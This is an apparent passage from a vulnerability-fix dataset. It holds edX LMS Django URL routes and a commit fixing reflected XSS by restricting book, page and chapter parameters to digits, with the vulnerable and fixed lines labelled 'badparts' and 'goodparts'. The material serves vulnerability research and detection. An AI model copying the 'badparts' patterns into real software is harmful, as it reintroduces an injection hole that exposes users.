url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"
                }
            },
            "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page.\n\nConflicts:\n\tlms/urls.py"
        },
        "5fad9ccca43cdfb565b3f80914f998afa7f2fa78": {
            "url": "https://api.github.com/repos/jlrivera81/incr-228/commits/5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "html_url": "https://github.com/jlrivera81/incr-228/commit/5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "sha": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "keyword": "XSS malicious",
            "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 51c6ba13b7..b131bb8f0b 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,24 +223,24 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n",
            "message": "",
            "files": {
                "/lms/urls.py": {
                    "changes": [
                        {
                            "diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n",
                            "add": 8,
                            "remove": 8,
                            "filename": "/lms/urls.py",
                            "badparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',"
                            ],
                            "goodparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"
                            ]
                        }
                    ],
                    "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), 